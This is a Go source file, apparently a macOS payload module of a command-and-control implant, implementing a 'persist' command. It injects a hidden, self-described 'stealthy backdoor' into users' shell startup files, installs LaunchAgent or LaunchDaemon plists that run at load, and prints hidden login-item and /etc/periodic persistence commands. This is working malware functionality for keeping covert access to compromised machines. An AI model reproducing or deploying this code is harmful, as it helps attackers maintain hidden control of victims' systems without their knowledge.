// server/docker/payloads/Darwin/action_persistence_darwin.go
//go:build darwin
// +build darwin

package main

import (
	"bytes"
	"fmt"
	"os"
	"os/user"
	"path/filepath"
	"strconv"
	"strings"
	"text/template"
	"time"
)

// PersistenceCommand handles various persistence methods on macOS
type PersistenceCommand struct{}

func (c *PersistenceCommand) Name() string {
	return "persist"
}

func (c *PersistenceCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if len(args) < 1 {
		return CommandResult{
			Output: "Usage: persist <method> [options]",
			ExitCode: 1,
		}
	}

	method := args[0]
	switch method {
	case "rc":
		return c.handleRCPersistence(args[1:])
	case "launch":
		return c.handleLaunchPersistence(args[1:])
	case "login":
		return c.handleLoginItemPersistence(args[1:])
	case "periodic":
		return c.handlePeriodicPersistence(args[1:])
	default:
		return CommandResult{
			Output:   fmt.Sprintf("Unknown persistence method: %s", method),
			ExitCode: 1,
		}
	}
}

// handleRCPersistence adds backdoor to shell RC files (same as Linux)
func (c *PersistenceCommand) handleRCPersistence(args []string) CommandResult {
	var targetUser string
	var command string
	var targetFiles []string

	// Parse arguments (maintaining Linux compatibility)
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "--user":
			if i+1 < len(args) {
				targetUser = args[i+1]
				i++
			}
		case "--command":
			if i+1 < len(args) {
				command = args[i+1]
				i++
			}
		case "--files":
			if i+1 < len(args) {
				targetFiles = strings.Split(args[i+1], ",")
				i++
			}
		}
	}

	if command == "" {
		return CommandResult{
			Output:   "Error: --command is required",
			ExitCode: 1,
		}
	}

	// Get target user
	var u *user.User
	var err error
	if targetUser != "" {
		u, err = user.Lookup(targetUser)
	} else {
		u, err = user.Current()
	}

	if err != nil {
		return CommandResult{
			Output:   fmt.Sprintf("Failed to get user: %v", err),
			ExitCode: 1,
		}
	}

	// If no files specified, use macOS defaults
	if len(targetFiles) == 0 {
		targetFiles = []string{
			filepath.Join(u.HomeDir, ".zshrc"),        // Default shell on modern macOS
			filepath.Join(u.HomeDir, ".bash_profile"), // Bash on macOS uses .bash_profile
			filepath.Join(u.HomeDir, ".bashrc"),       // Some users might have this
			filepath.Join(u.HomeDir, ".profile"),      // Generic profile
		}
	} else {
		// Expand paths for specified files
		for i, file := range targetFiles {
			if strings.HasPrefix(file, "~/") {
				targetFiles[i] = filepath.Join(u.HomeDir, file[2:])
			} else if !filepath.IsAbs(file) {
				targetFiles[i] = filepath.Join(u.HomeDir, file)
			}
		}
	}

	var results []string

	// Generate backdoor payload (same as Linux)
	backdoorPayload := c.generateBashrcPayload(command)

	for _, file := range targetFiles {
		if err := c.injectIntoRCFile(file, backdoorPayload); err != nil {
			results = append(results, fmt.Sprintf("[-] Failed to backdoor %s: %v", file, err))
		} else {
			results = append(results, fmt.Sprintf("[+] Successfully backdoored %s", file))
		}
	}

	return CommandResult{
		Output:   strings.Join(results, "\n"),
		ExitCode: 0,
	}
}

// generateBashrcPayload creates a stealthy backdoor payload (same as Linux)
func (c *PersistenceCommand) generateBashrcPayload(command string) string {
	payload := fmt.Sprintf(`
# System check (hidden)
if [ -z "$SUDO_COMMAND" ]; then
    if ! pgrep -f "%s" > /dev/null 2>&1; then
        (nohup %s > /dev/null 2>&1 &) 2>/dev/null
    fi
fi`, command, command)

	return payload
}

// injectIntoRCFile adds backdoor to RC file (same as Linux)
func (c *PersistenceCommand) injectIntoRCFile(filepath string, payload string) error {
	info, err := os.Stat(filepath)
	if err != nil {
		if os.IsNotExist(err) {
			return os.WriteFile(filepath, []byte(payload), 0644)
		}
		return err
	}

	content, err := os.ReadFile(filepath)
	if err != nil {
		return err
	}

	if bytes.Contains(content, []byte(payload)) {
		return fmt.Errorf("payload already exists in file")
	}

	newContent := append(content, []byte("\n"+payload)...)
	return os.WriteFile(filepath, newContent, info.Mode())
}

// handleLaunchPersistence installs LaunchAgent/LaunchDaemon
func (c *PersistenceCommand) handleLaunchPersistence(args []string) CommandResult {
	var serviceName string
	var command string
	var isSystem bool
	var interval int = 3600 // Default 1 hour

	// Parse arguments
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "--name":
			if i+1 < len(args) {
				serviceName = args[i+1]
				i++
			}
		case "--command":
			if i+1 < len(args) {
				command = args[i+1]
				i++
			}
		case "--system":
			isSystem = true
		case "--user":
			isSystem = false
		case "--interval":
			if i+1 < len(args) {
				if val, err := strconv.Atoi(args[i+1]); err == nil {
					interval = val
				}
				i++
			}
		}
	}

	if serviceName == "" || command == "" {
		return CommandResult{
			Output:   "Error: --name and --command are required",
			ExitCode: 1,
		}
	}

	// Determine installation path
	var plistPath string
	if isSystem {
		plistPath = fmt.Sprintf("/Library/LaunchDaemons/%s.plist", serviceName)
	} else {
		u, err := user.Current()
		if err != nil {
			return CommandResult{
				Output:   fmt.Sprintf("Failed to get current user: %v", err),
				ExitCode: 1,
			}
		}
		plistPath = fmt.Sprintf("%s/Library/LaunchAgents/%s.plist", u.HomeDir, serviceName)
	}

	// Create plist content
	plistContent := c.generateLaunchPlist(serviceName, command, interval)

	// Ensure directory exists
	dir := filepath.Dir(plistPath)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return CommandResult{
			Output:   fmt.Sprintf("Failed to create directory: %v", err),
			ExitCode: 1,
		}
	}

	// Write plist file
	if err := os.WriteFile(plistPath, []byte(plistContent), 0644); err != nil {
		return CommandResult{
			Output:   fmt.Sprintf("Failed to write plist: %v", err),
			ExitCode: 1,
		}
	}

	// Load the service
	loadCmd := fmt.Sprintf("launchctl load %s", plistPath)
	output := fmt.Sprintf("[+] LaunchAgent/Daemon installed at: %s\n", plistPath)
	output += fmt.Sprintf("[*] To load: %s\n", loadCmd)
	output += fmt.Sprintf("[*] To unload: launchctl unload %s\n", plistPath)
	output += fmt.Sprintf("[*] To remove: launchctl remove %s", serviceName)

	return CommandResult{
		Output:   output,
		ExitCode: 0,
	}
}

// generateLaunchPlist creates a LaunchAgent/Daemon plist
func (c *PersistenceCommand) generateLaunchPlist(label, command string, interval int) string {
	// Split command into program and arguments
	cmdParts := strings.Fields(command)
	program := cmdParts[0]
	args := cmdParts[1:]

	plistTemplate := `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{{.Label}}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{{.Program}}</string>
        {{range .Args}}<string>{{.}}</string>
        {{end}}
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>StartInterval</key>
    <integer>{{.Interval}}</integer>
    <key>StandardOutPath</key>
    <string>/tmp/{{.Label}}.out</string>
    <key>StandardErrorPath</key>
    <string>/tmp/{{.Label}}.err</string>
</dict>
</plist>`

	tmpl, _ := template.New("plist").Parse(plistTemplate)
	var buf bytes.Buffer
	tmpl.Execute(&buf, struct {
		Label    string
		Program  string
		Args     []string
		Interval int
	}{
		Label:    label,
		Program:  program,
		Args:     args,
		Interval: interval,
	})

	return buf.String()
}

// handleLoginItemPersistence adds a Login Item
func (c *PersistenceCommand) handleLoginItemPersistence(args []string) CommandResult {
	var itemName string
	var appPath string

	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "--name":
			if i+1 < len(args) {
				itemName = args[i+1]
				i++
			}
		case "--path":
			if i+1 < len(args) {
				appPath = args[i+1]
				i++
			}
		}
	}

	if itemName == "" || appPath == "" {
		return CommandResult{
			Output:   "Error: --name and --path are required",
			ExitCode: 1,
		}
	}

	// Use osascript to add login item
	script := fmt.Sprintf(`tell application "System Events" to make login item at end with properties {path:"%s", name:"%s", hidden:true}`, appPath, itemName)

	output := fmt.Sprintf("[*] Adding login item: %s -> %s\n", itemName, appPath)
	output += fmt.Sprintf("[*] Command: osascript -e '%s'\n", script)
	output += "[!] Note: This requires user interaction on modern macOS due to TCC"

	return CommandResult{
		Output:   output,
		ExitCode: 0,
	}
}

// handlePeriodicPersistence adds to periodic scripts
func (c *PersistenceCommand) handlePeriodicPersistence(args []string) CommandResult {
	var command string
	var frequency string

	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "--command":
			if i+1 < len(args) {
				command = args[i+1]
				i++
			}
		case "--frequency":
			if i+1 < len(args) {
				frequency = args[i+1]
				i++
			}
		}
	}

	if command == "" || frequency == "" {
		return CommandResult{
			Output:   "Error: --command and --frequency are required",
			ExitCode: 1,
		}
	}

	// Determine periodic directory
	var periodicDir string
	switch frequency {
	case "daily":
		periodicDir = "/etc/periodic/daily"
	case "weekly":
		periodicDir = "/etc/periodic/weekly"
	case "monthly":
		periodicDir = "/etc/periodic/monthly"
	default:
		return CommandResult{
			Output:   "Error: frequency must be daily, weekly, or monthly",
			ExitCode: 1,
		}
	}

	// Generate script name
	scriptName := fmt.Sprintf("999.%s", strings.Replace(command[:10], " ", "_", -1))
	scriptPath := filepath.Join(periodicDir, scriptName)

	// Create script content
	scriptContent := fmt.Sprintf(`#!/bin/sh
#
# Periodic %s task
#

%s

exit 0
`, frequency, command)

	output := fmt.Sprintf("[*] Periodic script would be installed at: %s\n", scriptPath)
	output += fmt.Sprintf("[*] Content:\n%s\n", scriptContent)
	output += "[!] Note: Requires root privileges to write to /etc/periodic/"

	return CommandResult{
		Output:      output,
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}
